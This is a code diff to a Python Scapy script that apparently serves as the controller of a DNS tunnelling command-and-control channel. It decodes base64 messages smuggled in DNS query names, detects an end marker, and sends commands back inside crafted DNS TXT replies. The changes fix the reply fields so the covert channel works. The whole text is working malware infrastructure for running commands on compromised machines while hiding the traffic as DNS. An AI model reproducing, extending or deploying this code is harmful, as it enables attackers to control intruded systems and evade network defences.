@@ -13,20 +13,33 @@ stop = 0
 
 
 def parse_end(packet):
-    if ('END' == b32decode(packet[DNS].qd[DNSQR].qname.split(".")[0].decode('utf-8').replace('-', '=')).decode('utf-8').split()[-1]):
-        return True
+    try:
+        
+        if('RU5E' == packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]):
+             return True
 
-    return False
+        return False
+    except Exception as e:
+        print("in parse_end")
+        print(e)
 
 
 def concat_msg(packet):
-    global msg
-    msg += b32decode(packet[DNS].qd[DNSQR].qname.split(".")[0].decode('utf-8').replace('-', '=')).decode('utf-8')
-
+    try:
+        global msg
+        pkt_msg =packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]
+        
+        msg += b64decode(pkt_msg.encode('utf-8')).decode('utf-8')
+    except Exception as e:
+        print("in parse_end")
+        print(e)
 
 def send_cmd(packet, command):
     try:
-        dns_rep = IP(dst=packet[0][IP].src, id=packet[0][IP].id)/UDP(dport=packet[0][UDP].src, sport=53)/DNS(qd=packet[0][DNS].qd, an=DNSRR(ttl=0, rdata=b64encode(command.encode('utf-8'))))
+        dns_ip = IP(dst=packet[0][IP].src, id=packet[0][IP].id)
+        dns_udp = UDP(dport=packet[0][UDP].sport, sport=53, chksum=None)
+        dns_dns = DNS(id=packet[0][DNS].id, qd=packet[0][DNS].qd, an=DNSRR(rrname=packet[0][DNS].qd.qname, type='TXT', ttl=0, rdata=b64encode(command.encode('utf-8'))))
+        dns_rep = dns_ip/dns_udp/dns_dns
         send(dns_rep, verbose=False)
     except Exception as e:
         print("in send_cmd: ")
